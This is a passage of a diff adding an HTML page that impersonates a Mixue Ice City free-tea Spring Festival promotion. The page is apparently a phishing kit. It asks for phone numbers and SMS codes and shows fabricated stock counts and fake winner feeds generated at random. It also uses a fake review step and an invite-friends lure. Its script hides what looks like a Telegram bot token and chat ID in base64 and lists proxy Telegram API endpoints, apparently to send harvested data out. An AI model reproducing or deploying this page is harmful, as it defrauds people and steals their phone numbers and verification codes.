+      transform: translateY(-50%);
+    }
+    .nav-marker {
+      position: absolute;
+      font-size: 20px;
+      z-index: 10;
+    }
+    .nav-start { top: 40%; left: 20%; }
+    .nav-end { top: 60%; right: 20%; }
+    .nav-info {
+      padding: 20px;
+    }
+    .nav-distance {
+      display: flex;
+      justify-content: space-around;
+      margin-bottom: 20px;
+    }
+    .nav-info-value {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: #1890ff;
+    }
+    .nav-info-label {
+      font-size: 0.8rem;
+      color: #666;
+    }
+    .nav-actions {
+      display: flex;
+      gap: 10px;
+    }
+    .nav-action-btn {
+      flex: 1;
+      padding: 12px;
+      border-radius: 8px;
+      border: none;
+      font-weight: 700;
+      cursor: pointer;
+      font-size: 0.9rem;
+    }
+    .start-nav-btn {
+      background: linear-gradient(135deg, #1890ff, #36cfc9);
+      color: white;
+    }
+    .open-map-btn {
+      background: #f0f2f5;
+      color: #333;
+    }
+
+    /* 网络错误提示 */
+    .network-error {
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 30px;
+      border-radius: 20px;
+      text-align: center;
+      box-shadow: 0 10px 40px rgba(0,0,0,0.2);
+      z-index: 999999;
+      display: none;
+    }
+    .network-error.show {
+      display: block;
+    }
+    .network-error h3 {
+      color: var(--mixue-red);
+      margin-bottom: 10px;
+    }
+    .network-error p {
+      color: #666;
+      font-size: 0.9rem;
+      margin-bottom: 20px;
+    }
+    .retry-btn {
+      background: var(--mixue-red);
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 25px;
+      font-weight: 700;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+<!-- 防作弊警告 -->
+<div class="cheat-warning" id="cheatWarning">
+  ⚠️ 检测到异常操作，请使用正常设备参与活动
+</div>
+
+<!-- 网络错误提示 -->
+<div class="network-error" id="networkError">
+  <h3>🌐 网络连接失败</h3>
+  <p>GitHub Pages 访问不稳定，请尝试刷新页面或更换网络</p>
+  <button class="retry-btn" onclick="location.reload()">刷新重试</button>
+</div>
+
+<!-- 雪王客服悬浮按钮 -->
+<div class="chat-float-btn" id="chatFloatBtn" onclick="openChat()">
+  💬
+  <div class="notification-badge" id="chatBadge">1</div>
+</div>
+
+<!-- 启动加载画面 -->
+<div class="splash-screen" id="splashScreen">
+  <div class="splash-logo">🍦</div>
+  <div class="splash-text" id="splashText">雪王正在赶来…</div>
+  <div class="splash-progress">
+    <div class="splash-progress-bar" id="splashProgress"></div>
+  </div>
+  <div class="splash-hint">正在加载甜蜜福利...</div>
+</div>
+
+<div class="toast-container" id="toastContainer"></div>
+
+<div class="loading-mask" id="loadingMask">
+  <div class="loading-spinner"></div>
+  <div class="loading-title">雪王正在观察一切……</div>
+  <div class="loading-subtitle">正在检查环境中，不要离开或刷新此页面</div>
+  <div class="loading-hint">预计审核时间：30秒 - 2分钟<br>请保持网络畅通</div>
+</div>
+
+<!-- 主页面 -->
+<div class="card" id="mainPage">
+  <div class="header">
+    <h1>蜜雪冰城</h1>
+    <p>春节狂欢 · 免费领大杯柠檬茶</p>
+    <div class="activity-period">
+      活动进行中：2026年1月30日 — 2026年2月18日
+      <span id="globalTimer">本轮名额倒计时：计算中...</span>
+    </div>
+    <div class="stock-info">全国限量<span id="totalStockDisplay">5000</span>份，已领 <span id="claimedCount">4567</span> 张，仅剩 <span id="remainCount">433</span> 张</div>
+  </div>
+
+  <div class="join-count">已有 <span id="countNum">4,567</span> 人抢到福利</div>
+
+  <div class="content">
+    <div class="barrage-box" id="barrageBox"></div>
+
+    <div class="fair-tip" style="text-align:center; color:#666; margin-bottom:16px; font-size:0.8rem;">为保证公平，严禁使用脚本或外挂，违规永久封号</div>
+
+    <div class="input-box">
+      <input type="text" id="nickname" placeholder="昵称（选填）" maxlength="20" autocomplete="off" />
+    </div>
+
+    <div class="input-box">
+      <input type="tel" id="phone" placeholder="请输入手机号" maxlength="11" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
+    </div>
+
+    <div class="verify-slider" id="verifySlider">
+      <div class="verify-bg" id="verifyBg"></div>
+      <div class="verify-block" id="verifyBlock">→</div>
+      <div class="verify-text">向右滑动完成验证</div>
+    </div>
+
+    <div class="input-box">
+      <input type="text" id="code" placeholder="请输入验证码" maxlength="6" inputmode="numeric" pattern="[0-9]*" autocomplete="off" />
+    </div>
+
+    <button class="btn" id="getCodeBtn" disabled>获取验证码</button>
+    <button class="btn" id="submitBtn" style="display:none;" disabled>立即领取</button>
+
+    <div id="countdown" style="opacity:0; color:var(--mixue-red); text-align:center; margin-top:12px; font-size:0.85rem;"></div>
+
+    <div class="agreement">
+      登录即代表同意
+      <a onclick="showAgreement('privacy')">《隐私政策》</a>
+      和
+      <a onclick="showAgreement('user')">《用户协议》</a>
+    </div>
+  </div>
+</div>
+
+<!-- 邀请好友页面 -->
+<div class="card hidden" id="invitePage">
+  <div class="invite-header">
+    <h2>🎉 恭喜通过审核！</h2>
+    <p>还差一点点就能领到券码啦</p>
+    <div class="invite-progress">
+      <div class="invite-step completed" id="step1">1</div>
+      <div class="invite-line completed" id="line1"></div>
+      <div class="invite-step" id="step2">2</div>
+      <div class="invite-line" id="line2"></div>
+      <div class="invite-step" id="step3">3</div>
+    </div>
+    <p style="font-size: 0.85rem; opacity: 0.9;">邀请 3 位好友助力即可领取</p>
+  </div>
+  
+  <div class="content">
+    <div class="page-tabs">
+      <button class="page-tab active" onclick="switchTab('invite')">邀请好友</button>
+      <button class="page-tab" onclick="switchTab('store')">附近门店</button>
+      <button class="page-tab" onclick="switchTab('delivery')">外卖配送</button>
+    </div>
+
+    <div id="inviteTabContent">
+      <div class="countdown-bonus" id="countdownBonus">
+        <span class="label">⏰ 限时翻倍奖励</span>
+        <span class="timer" id="bonusTimer">05:00</span>
+      </div>
+
+      <div class="leaderboard">
+        <h4>🏆 邀请排行榜</h4>
+        <div class="leaderboard-item">
+          <div class="leaderboard-rank rank-1">1</div>
+          <div class="leaderboard-name">李**</div>
+          <div class="leaderboard-count">128人</div>
+        </div>
+        <div class="leaderboard-item">
+          <div class="leaderboard-rank rank-2">2</div>
+          <div class="leaderboard-name">王**</div>
+          <div class="leaderboard-count">96人</div>
+        </div>
+        <div class="leaderboard-item">
+          <div class="leaderboard-rank rank-3">3</div>
+          <div class="leaderboard-name">张**</div>
+          <div class="leaderboard-count">85人</div>
+        </div>
+      </div>
+
+      <div class="invite-stats">
+        <div class="bonus-tag" id="bonusTag" style="display: none;">翻倍中</div>
+        <div class="invite-count" id="inviteCount">0</div>
+        <div class="invite-label">位好友已助力</div>
+        <div class="chance-count" id="chanceCount">剩余抽奖次数：0</div>
+      </div>
+
+      <div class="wheel-container" id="wheelContainer" style="display: none;">
+        <div class="wheel" id="wheel">
+          <div class="wheel-item"><span class="emoji">🎁</span><span class="text">柠檬茶券</span></div>
+          <div class="wheel-item"><span class="emoji">😢</span><span class="text">谢谢惠顾</span></div>
+          <div class="wheel-item"><span class="emoji">🍦</span><span class="text">冰淇淋券</span></div>
+          <div class="wheel-item"><span class="emoji">😭</span><span class="text">再接再厉</span></div>
+          <div class="wheel-item"><span class="emoji">🧋</span><span class="text">奶茶券</span></div>
+          <div class="wheel-item"><span class="emoji">🤔</span><span class="text">差一点</span></div>
+          <div class="wheel-item"><span class="emoji">🎊</span><span class="text">神秘大奖</span></div>
+          <div class="wheel-item"><span class="emoji">😅</span><span class="text">下次再来</span></div>
+        </div>
+        <div class="wheel-pointer">👆</div>
+      </div>
+
+      <div class="redeem-box">
+        <div class="input-box" style="flex:1; margin-bottom:0;">
+          <input type="text" id="inviteCodeInput" placeholder="请输入好友邀请码" maxlength="6" />
+        </div>
+        <button class="redeem-btn" id="redeemBtn">兑换</button>
+      </div>
+
+      <button class="btn check-in-btn" id="checkInBtn">📅 每日签到 (+1次机会)</button>
+      <button class="btn invite-more-btn" id="inviteMoreBtn">邀请好友</button>
+      <button class="btn wheel-btn hidden" id="wheelBtn">🎰 开始抽奖</button>
+
+      <div class="invite-rules">
+        <h4>🎮 活动规则</h4>
+        <li>每邀请1位好友获得随机抽奖次数（1-5次）</li>
+        <li>限时翻倍期间邀请奖励翻倍</li>
+        <li>邀请满3位好友必得柠檬茶券码</li>
+        <li>每日签到可获得额外抽奖机会</li>
+        <li>活动最终解释权归蜜雪冰城所有</li>
+      </div>
+    </div>
+
+    <div id="storeTabContent" style="display: none;">
+      <div class="store-section">
+        <h4>📍 附近门店（虚拟）</h4>
+        <div id="storeListContainer">
+          <div class="location-loading">
+            <div>正在定位中...</div>
+            <div style="font-size: 0.8rem; margin-top: 8px;">请允许获取位置权限</div>
+          </div>
+        </div>
+      </div>
+      <div class="store-section">
+        <h4>🎯 门店服务</h4>
+        <div class="delivery-options">
+          <div class="delivery-option" onclick="selectDeliveryType('self')">
+            <div class="delivery-option-icon">🚶</div>
+            <div class="delivery-option-title">到店自取</div>
+            <div class="delivery-option-desc">免排队，立取立走</div>
+          </div>
+          <div class="delivery-option" onclick="selectDeliveryType('delivery')">
+            <div class="delivery-option-icon">🛵</div>
+            <div class="delivery-option-title">外卖配送</div>
+            <div class="delivery-option-desc">骑手30分钟送达</div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="deliveryTabContent" style="display: none;">
+      <div class="store-section">
+        <h4>🛵 配送服务</h4>
+        <div class="delivery-options">
+          <div class="delivery-option selected">
+            <div class="delivery-option-icon">⚡</div>
+            <div class="delivery-option-title">极速达</div>
+            <div class="delivery-option-desc">30分钟内送达</div>
+          </div>
+          <div class="delivery-option">
+            <div class="delivery-option-icon">🕐</div>
+            <div class="delivery-option-title">预约送</div>
+            <div class="delivery-option-desc">指定时间送达</div>
+          </div>
+        </div>
+        <button class="btn" onclick="callRider()" style="margin-top: 12px; background: linear-gradient(135deg, #52c41a, #73d13d);">
+          🛵 呼叫骑手配送
+        </button>
+      </div>
+      <div class="store-section">
+        <h4>📋 配送说明</h4>
+        <div class="invite-rules" style="margin-top: 0;">
+          <li>配送范围：门店周边3公里</li>
+          <li>配送费：活动期间免配送费</li>
+          <li>预计送达：30-45分钟</li>
+          <li>支持实时追踪骑手位置</li>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div class="modal" id="successModal">
+  <div class="modal-content">
+    <h2>🎉 领取成功！</h2>
+    <p>大杯柠檬茶券已发至手机</p>
+    <div class="coupon-code" id="couponCode">MX2026-ICE-ABCD1234</div>
+    <p style="font-weight:bold; margin:16px 0; font-size:0.9rem;">请尽快到店核销，过期无效</p>
+    <div class="modal-emoji">🎉🍋🔥</div>
+    <button class="btn" id="closeModalBtn" style="height:48px; font-size:1rem;">好的，去兑换！</button>
+    <button class="btn copy-btn" id="copyCouponBtn">一键复制券码</button>
+    <button class="btn share-btn" id="shareBtn">分享给好友</button>
+    <button class="btn history-btn" id="viewHistoryBtn">查看我的券码历史</button>
+    <button class="btn" onclick="showNearbyStores()" style="margin-top: 8px; background: linear-gradient(135deg, #1890ff, #36cfc9); height:48px; font-size:1rem;">
+      📍 查看附近门店
+    </button>
+  </div>
+</div>
+
+<div class="modal rejected-modal" id="rejectedModal">
+  <div class="modal-content">
+    <h2>审核未通过</h2>
+    <p>抱歉，您的申请未通过人工审核</p>
+    <p style="color:#666; font-size:0.85rem; margin:12px 0;">可能原因：信息异常、重复领取或存在违规操作</p>
+    <div class="modal-emoji">😔</div>
+    <button class="btn" onclick="document.getElementById('rejectedModal').classList.remove('show')" style="background:linear-gradient(135deg, #999, #666); height:48px;">我知道了</button>
+  </div>
+</div>
+
+<div class="modal" id="agreementModal">
+  <div class="modal-content" style="max-height:80vh; overflow-y:auto; padding:20px; text-align:left;">
+    <h2 id="agreementTitle" style="font-size:1.3rem;">协议标题</h2>
+    <div id="agreementContent" style="font-size:0.85rem; line-height:1.6; color:#333; white-space:pre-wrap; margin:12px 0;"></div>
+    <button class="btn" style="margin-top:16px; width:100%; height:48px; font-size:1rem;" onclick="document.getElementById('agreementModal').classList.remove('show')">我已阅读</button>
+  </div>
+</div>
+
+<div class="modal" id="historyModal">
+  <div class="modal-content" style="max-width:340px;">
+    <h2 style="font-size:1.3rem;">我的券码历史</h2>
+    <div class="history-list" id="historyList"></div>
+    <button class="btn" onclick="document.getElementById('historyModal').classList.remove('show')" style="height:48px; font-size:1rem;">关闭</button>
+  </div>
+</div>
+
+<div class="modal" id="chatModal" style="z-index:100001;">
+  <div class="modal-content" style="padding:0; max-width:360px; height:480px; display:flex; flex-direction:column; overflow:hidden;">
+    <div style="background: linear-gradient(135deg, var(--mixue-red), #C92A39); color:white; padding:12px; text-align:center; position:relative;">
+      <div style="width:40px; height:40px; border-radius:50%; border:3px solid white; background:var(--mixue-red); display:flex; align-items:center; justify-content:center; font-size:20px; position:absolute; left:12px; top:50%; transform:translateY(-50%); box-shadow:0 2px 8px rgba(0,0,0,0.3);">🍦</div>
+      <div style="margin-left:60px; text-align:left;">
+        <div style="font-weight:bold; font-size:1rem;">雪王小冰</div>
+        <div style="font-size:0.75rem; opacity:0.9;">在线 · 通常1分钟内回复</div>
+      </div>
+    </div>
+    
+    <div id="chatMessages" style="flex:1; padding:12px; overflow-y:auto; background:#f8f9fa; display:flex; flex-direction:column;">
+    </div>
+    
+    <div style="border-top:1px solid #eee; padding:10px; background:white; display:flex; gap:8px;">
+      <input type="text" id="chatInput" placeholder="说点啥吧～（比如：券码怎么用？）" 
+             style="flex:1; height:40px; padding:0 16px; border:1px solid #ddd; border-radius:20px; font-size:0.9rem;">
+      <button id="sendChatBtn" style="width:50px; height:40px; background:var(--mixue-red); color:white; border:none; border-radius:20px; font-weight:bold; cursor:pointer; font-size:0.8rem;">发送</button>
+    </div>
+  </div>
+</div>
+
+<div class="modal rider-modal" id="riderModal">
+  <div class="modal-content">
+    <h2 style="font-size:1.3rem;">🛵 骑手已接单</h2>
+    <div class="rider-info">
+      <div class="rider-avatar">👨‍🍳</div>
+      <div class="rider-name" id="riderName">王师傅</div>
+      <div class="rider-id">骑手编号：MX-R-2026-8888</div>
+      <div class="rider-stats">
+        <div class="rider-stat">
+          <div class="rider-stat-value">4.9</div>
+          <div class="rider-stat-label">评分</div>
+        </div>
+        <div class="rider-stat">
+          <div class="rider-stat-value">1286</div>
+          <div class="rider-stat-label">单量</div>
+        </div>
+        <div class="rider-stat">
+          <div class="rider-stat-value">98%</div>
+          <div class="rider-stat-label">准时率</div>
+        </div>
+      </div>
+    </div>
+    <div class="delivery-map">
+      <div class="map-route"></div>
+      <div class="rider-marker">🛵</div>
+    </div>
+    <div class="delivery-progress">
+      <div class="progress-line">
+        <div class="progress-step">
+          <div class="step-dot completed">✓</div>
+          <div class="step-label">已接单</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-dot active">📦</div>
+          <div class="step-label">取货中</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-dot">🛵</div>
+          <div class="step-label">配送中</div>
+        </div>
+        <div class="progress-step">
+          <div class="step-dot">🏠</div>
+          <div class="step-label">已送达</div>
+        </div>
+      </div>
+    </div>
+    <div class="eta-box">
+      预计送达时间：<span id="etaTime">12:30</span>（约25分钟）
+    </div>
+    <button class="btn" onclick="closeRiderModal()" style="margin-top: 12px; height:48px; font-size:1rem;">查看实时位置</button>
+  </div>
+</div>
+
+<div class="modal nav-modal" id="navModal">
+  <div class="modal-content">
+    <div class="nav-header">
+      <h3>🧭 导航到门店</h3>
+      <p style="margin: 5px 0 0; opacity: 0.9; font-size: 0.85rem;" id="navStoreName">蜜雪冰城（中心店）</p>
+    </div>
+    <div class="nav-map-container">
+      <div class="fake-map">
+        <div class="fake-road fake-road-h"></div>
+        <div class="fake-road fake-road-v"></div>
+        <div class="nav-route-line"></div>
+        <div class="nav-marker nav-start">📍</div>
+        <div class="nav-marker nav-end">🏪</div>
+      </div>
+    </div>
+    <div class="nav-info">
+      <div class="nav-distance">
+        <div class="nav-info-item">
+          <div class="nav-info-value" id="navDistance">1.2</div>
+          <div class="nav-info-label">公里</div>
+        </div>
+        <div class="nav-info-item">
+          <div class="nav-info-value" id="navTime">15</div>
+          <div class="nav-info-label">分钟</div>
+        </div>
+        <div class="nav-info-item">
+          <div class="nav-info-value" id="navTraffic">畅通</div>
+          <div class="nav-info-label">路况</div>
+        </div>
+      </div>
+      <div class="nav-actions">
+        <button class="nav-action-btn start-nav-btn" onclick="startNavigation()">开始导航</button>
+        <button class="nav-action-btn open-map-btn" onclick="openExternalMap()">打开地图APP</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ============================= 配置 =============================
+const _0x5f2c = {
+  _b: 'ODMzODY3MjM5NTpBQUg5cmJ5czlzalktQnRodWJ2WHlWdjJScl9kX1ByX2tpSQ==',
+  _c: 'ODQzOTQ0ODA4Nw==',
+  _i: 'Njk4NTlhZmFkMGVhODgxZjQwYTRlNTI2',
+  _k: 'JDJhJDEwJERlTlBYMVIwQzBQanNoREpmL3cxZC45d2M4ZkhMTkIwYUFHQndYbXJuc01DdlNWVHQvdmdh'
+};
+
+function _d(b) {
+  const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+  let o = '', c1, c2, c3, e1, e2, e3, e4, i = 0;
+  b = b.replace(/[^A-Za-z0-9+/=]/g, '');
+  while (i < b.length) {
+    e1 = a.indexOf(b.charAt(i++));
+    e2 = a.indexOf(b.charAt(i++));
+    e3 = a.indexOf(b.charAt(i++));
+    e4 = a.indexOf(b.charAt(i++));
+    c1 = (e1 << 2) | (e2 >> 4);
+    c2 = ((e2 & 15) << 4) | (e3 >> 2);
+    c3 = ((e3 & 3) << 6) | e4;
+    o += String.fromCharCode(c1);
+    if (e3 !== 64) o += String.fromCharCode(c2);
+    if (e4 !== 64) o += String.fromCharCode(c3);
+  }
+  try {
+    return decodeURIComponent(escape(o));
+  } catch (e) {
+    return o;
+  }
+}
+
+const _cfg = {
+  t: _d(_0x5f2c._b),
+  u: _d(_0x5f2c._c),
+  b: _d(_0x5f2c._i),
+  m: _d(_0x5f2c._k)
+};
+
+const TOTAL_STOCK = 5000;
+let claimed = 4567;
+let isVerifySuccess = false;
+let timers = {};
+let isSending = false;
+let isPolling = false;
+let isSpinning = false;
+let bonusActive = true;
+let currentTab = 'invite';
+let selectedStore = null;
+let userLocation = null;
+let chatOpened = false;
+let tgApiFailed = false;
+
+// 备用TG API列表（反代）
+const TG_API_BACKUPS = [
+  'https://api.telegram.org',
+  'https://tg-api-gw.pages.dev',
+  'https://api.telegram.org.cn'
+];
+
+let currentTgApiIndex = 0;
+
+// 邀请系统状态
+let inviteState = {
+  invitedCount: 0,
+  chanceCount: 0,
+  hasWon: false,
+  currentPhone: '',
+  currentNickname: '',
+  checkedIn: false,
+  lastCheckIn: null
+};
+
+const virtualStores = [
+  { id: 1, name: '蜜雪冰城（中心广场店）', address: '中心广场商业街A区108号', distance: 0.8, lat: 39.9042, lng: 116.4074, rating: 4.8, businessHours: '09:00-23:00', phone: '010-88886666' },
+  { id: 2, name: '蜜雪冰城（万达广场店）', address: '万达广场3楼美食区305号', distance: 1.5, lat: 39.9123, lng: 116.4156, rating: 4.9, businessHours: '10:00-22:00', phone: '010-88887777' },
+  { id: 3, name: '蜜雪冰城（大学路店）', address: '大学路小吃街88号', distance: 2.3, lat: 39.8987, lng: 116.3987, rating: 4.7, businessHours: '08:30-24:00', phone: '010-88888888' },
+  { id: 4, name: '蜜雪冰城（地铁站店）', address: '地铁1号线朝阳门站B出口旁', distance: 3.1, lat: 39.9201, lng: 116.4289, rating: 4.6, businessHours: '07:00-23:30', phone: '010-88889999' },
+  { id: 5, name: '蜜雪冰城（社区店）', address: '阳光花园小区北门底商12号', distance: 4.2, lat: 39.8856, lng: 116.3856, rating: 4.9, businessHours: '09:00-22:00', phone: '010-88880000' }
+];
+
+const riderNames = ['王师傅', '李师傅', '张师傅', '刘师傅', '陈师傅', '杨师傅'];
+
+function loadFromStorage() {
+  try {
+    const saved = localStorage.getItem('mx_invite_state');
+    if (saved) {
+      const data = JSON.parse(saved);
+      inviteState.invitedCount = data.invitedCount || 0;
+      inviteState.chanceCount = data.chanceCount || 0;
+      inviteState.hasWon = data.hasWon || false;
+      inviteState.checkedIn = data.checkedIn || false;
+      inviteState.lastCheckIn = data.lastCheckIn || null;
+      
+      const today = new Date().toDateString();
+      if (inviteState.lastCheckIn !== today) {
+        inviteState.checkedIn = false;
+      }
+    }
+  } catch (e) {
+    console.warn('读取本地存储失败:', e);
+  }
+}
+
+function saveToStorage() {
+  try {
+    localStorage.setItem('mx_invite_state', JSON.stringify({
+      invitedCount: inviteState.invitedCount,
+      chanceCount: inviteState.chanceCount,
+      hasWon: inviteState.hasWon,
+      checkedIn: inviteState.checkedIn,
+      lastCheckIn: inviteState.lastCheckIn,
+      currentPhone: inviteState.currentPhone
+    }));
+  } catch (e) {
+    console.warn('保存到本地存储失败:', e);
+  }
+}
+
+function generateCouponCode() {
+  const prefix = 'MX' + Math.floor(100000 + Math.random()*900000);
+  const suffix = Math.random().toString(36).slice(2,8).toUpperCase();
+  return `${prefix}-ICE-${suffix}`;
+}
+
+// 缓存DOM元素
+const els = {};
+function cacheElements() {
+  const ids = ['phone','nickname','code','couponCode','getCodeBtn','submitBtn','countdown','modal','rejectedModal',
+    'claimedCount','remainCount','countNum','barrageBox','verifySlider','verifyBlock','verifyBg','loadingMask',
+    'globalTimer','closeModalBtn','agreementModal','agreementTitle','agreementContent','mainPage','invitePage',
+    'inviteCount','chanceCount','inviteMoreBtn','wheelBtn','wheelContainer','wheel','step1','step2','step3',
+    'line1','line2','inviteCodeInput','redeemBtn','checkInBtn','bonusTag','bonusTimer','keyboardHint',
+    'cheatWarning','copyCouponBtn','shareBtn','viewHistoryBtn','historyList','chatModal','chatMessages',
+    'chatInput','sendChatBtn','chatFloatBtn','chatBadge','storeListContainer','riderModal','navModal',
+    'navStoreName','navDistance','navTime','navTraffic','etaTime','riderName','networkError'];
+  
+  ids.forEach(id => {
+    els[id] = document.getElementById(id);
+  });
+}
+
+function showToast(msg, duration = 2500) {
+  const container = document.getElementById('toastContainer');
+  if (!container) return;
+  const t = document.createElement('div');
+  t.className = 'toast';
+  t.innerHTML = msg;
+  container.appendChild(t);
+  setTimeout(() => t.remove(), duration);
+}
+
+function createParticles(x, y) {
+  const colors = ['#E63946', '#FFD166', '#52c41a', '#FA541C', '#722ED1'];
+  const emojis = ['🎉', '🎊', '✨', '💫', '⭐', '🍋', '🍦'];
+  
+  for (let i = 0; i < 15; i++) {
+    const particle = document.createElement('div');
+    particle.className = 'particle';
+    particle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
+    particle.style.left = x + 'px';
+    particle.style.top = y + 'px';
+    particle.style.fontSize = (16 + Math.random() * 16) + 'px';
+    particle.style.color = colors[Math.floor(Math.random() * colors.length)];
+    particle.style.setProperty('--tx', (Math.random() - 0.5) * 250 + 'px');
+    particle.style.setProperty('--ty', (Math.random() - 0.5) * 250 + 'px');
+    document.body.appendChild(particle);
+    setTimeout(() => particle.remove(), 3000);
+  }
+}
+
+function shootBarrage(customPhone = null) {
+  const prefixes = ['134','135','136','137','138','139','147','150','151','152','157','158','159','172','178','182','183','184','187','188','198','130','131','132','145','155','156','166','175','176','185','186','133','149','153','173','177','180','181','189','199'];
+  
+  let phoneDisplay;
+  if (customPhone && /^1[3-9]\d{9}$/.test(customPhone)) {
+    phoneDisplay = customPhone.slice(0,3) + "****" + customPhone.slice(7);
+  } else {
+    const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+    const suffix = Math.floor(1000 + Math.random() * 9000);
+    phoneDisplay = prefix + "****" + suffix;
+  }
+
+  const surnames = ['赵','钱','孙','李','周','吴','郑','王','冯','陈','褚','卫','蒋','沈','韩','杨','朱','秦','尤','许','何','吕','施','张','孔','曹','严','华','金','魏','陶','姜'];
+  const surname = surnames[Math.floor(Math.random() * surnames.length)];
+
+  const item = document.createElement('div');
+  item.className = 'barrage-item';
+  item.textContent = `${surname}** ${phoneDisplay} 刚刚领取成功！`;
+  item.style.top = (8 + Math.random() * 30) + 'px';
+  item.style.color = ['#c1121f', '#e63946', '#d00000', '#9d0208'][Math.floor(Math.random() * 4)];
+  item.style.animationDuration = (3 + Math.random() * 2) + 's';
+
+  if (els.barrageBox) {
+    els.barrageBox.appendChild(item);
+    setTimeout(() => item.remove(), 6000);
+  }
+}
+
+function showAgreement(type) {
+  const titles = { privacy: '隐私政策', user: '用户协议' };
+  const contents = {
+    privacy: `最后更新：2026年1月1日
+
+我们重视您的隐私。本政策说明我们如何收集、使用和保护您的信息。
+
+1. 收集的信息
+- 手机号、昵称（您主动提供）
+- 设备信息、IP地址、访问时间
+- 位置信息（用于查找附近门店）
+
+2. 使用目的
+- 身份验证与福利发放
+- 防刷、防作弊
+- 服务优化与门店推荐
+
+3. 信息共享
+仅在必要时与蜜雪冰城官方合作门店共享券码信息用于核销，不会出售您的个人信息。
+
+感谢您的信任！`,
+    user: `最后更新：2026年1月1日
+
+1. 服务说明
+本活动提供限量免费大杯柠檬茶券，先到先得。
+
+2. 使用规则
+- 每手机号限领1次
+- 禁止使用脚本、接码平台
+- 券码需在有效期内到店核销
+
+3. 违规处理
+发现作弊行为将取消资格并永久限制参与。
+
+4. 免责声明
+活动最终解释权归蜜雪冰城所有。
+
+点击"获取验证码"即表示同意本协议全部条款。`
+  };
+
+  if (els.agreementTitle) els.agreementTitle.textContent = titles[type];
+  if (els.agreementContent) els.agreementContent.textContent = contents[type];
+  if (els.agreementModal) els.agreementModal.classList.add('show');
+}
+
+function updateStock() {
+  const remain = Math.max(0, TOTAL_STOCK - claimed);
+  if (els.claimedCount) els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
+  if (els.remainCount) els.remainCount.textContent = remain.toLocaleString('zh-CN');
+  if (els.countNum) els.countNum.textContent = claimed.toLocaleString('zh-CN');
+  if (remain < 100 && els.remainCount) els.remainCount.classList.add('low-stock');
+}
+
+function fakeClaim() {
+  if (Math.random() > 0.4) {
+    claimed += 1 + Math.floor(Math.random() * 3);
+    updateStock();
+    shootBarrage();
+  }
+}
+
+function checkPhoneValid() {
+  const val = els.phone ? els.phone.value.trim() : '';
+  const valid = /^1[3-9]\d{9}$/.test(val);
+  if (els.phone) els.phone.classList.toggle('input-error', val && !valid);
+
+  if (valid) {
+    if (els.verifySlider) els.verifySlider.classList.add('show');
+    if (els.verifyBlock && !els.verifyBlock.dataset.inited) initSlider();
+  } else {
+    if (els.verifySlider) els.verifySlider.classList.remove('show');
+    isVerifySuccess = false;
+    resetSlider();
+  }
+  if (els.getCodeBtn) els.getCodeBtn.disabled = !valid || !isVerifySuccess || isSending;
+}
+
+function resetSlider() {
+  if (!els.verifySlider) return;
+  els.verifySlider.classList.remove('verify-success');
+  if (els.verifyBlock) {
+    els.verifyBlock.style.left = '0';
+    els.verifyBlock.textContent = '→';
+  }
+  if (els.verifyBg) els.verifyBg.style.width = '0';
+  const text = els.verifySlider.querySelector('.verify-text');
+  if (text) text.textContent = '向右滑动完成验证';
+}
+
+function initSlider() {
+  if (!els.verifyBlock || !els.verifySlider) return;
+  els.verifyBlock.dataset.inited = 'true';
+  let dragging = false;
+  const max = els.verifySlider.offsetWidth - els.verifyBlock.offsetWidth;
+
+  const start = e => {
+    if (isVerifySuccess) return;
+    dragging = true;
+    const sx = (e.clientX || e.touches?.[0]?.clientX) || 0;
+    const sl = parseFloat(els.verifyBlock.style.left) || 0;
+
+    const move = ev => {
+      if (!dragging) return;
+      const cx = (ev.clientX || ev.touches?.[0]?.clientX) || 0;
+      const dx = cx - sx;
+      let l = Math.max(0, Math.min(sl + dx, max));
+      els.verifyBlock.style.left = l + 'px';
+      if (els.verifyBg) els.verifyBg.style.width = l + 'px';
+    };
+
+    const end = () => {
+      dragging = false;
+      const l = parseFloat(els.verifyBlock.style.left) || 0;
+      if (l >= max * 0.85) {
+        isVerifySuccess = true;
+        els.verifySlider.classList.add('verify-success');
+        els.verifyBlock.textContent = '✓';
+        els.verifyBlock.style.left = max + 'px';
+        if (els.verifyBg) els.verifyBg.style.width = max + 'px';
+        const text = els.verifySlider.querySelector('.verify-text');
+        if (text) text.textContent = '验证成功';
+        checkPhoneValid();
+      } else {
+        resetSlider();
+      }
+      document.removeEventListener('mousemove', move);
+      document.removeEventListener('touchmove', move);
+      document.removeEventListener('mouseup', end);
+      document.removeEventListener('touchend', end);
+    };
+
+    document.addEventListener('mousemove', move);
+    document.addEventListener('touchmove', move, {passive:false});
+    document.addEventListener('mouseup', end);
+    document.addEventListener('touchend', end);
+  };
+
+  els.verifyBlock.addEventListener('mousedown', start);
+  els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e); }, {passive:false});
+}
+
+function startCountdown() {
+  if (!els.globalTimer) return;
+  let sec = 120*60 + Math.floor(Math.random()*180*60);
+  const tick = () => {
+    if (sec <= 0) {
+      els.globalTimer.textContent = '本轮已结束，请刷新';
+      setTimeout(() => location.reload(), 4000);
+      return;
+    }
+    const h = Math.floor(sec/3600).toString().padStart(2,'0');
+    const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
+    const s = (sec%60).toString().padStart(2,'0');
+    els.globalTimer.textContent = `本轮名额倒计时：${h}:${m}:${s}`;
+    sec--;
+  };
+  tick();
+  timers.global = setInterval(tick, 1000);
+}
+
+function startBonusCountdown() {
+  let sec = 300;
+  const tick = () => {
+    if (sec <= 0) {
+      bonusActive = false;
+      if (els.bonusTag) els.bonusTag.style.display = 'none';
+      const bonusEl = document.querySelector('.countdown-bonus');
+      if (bonusEl) bonusEl.style.opacity = '0.5';
+      return;
+    }
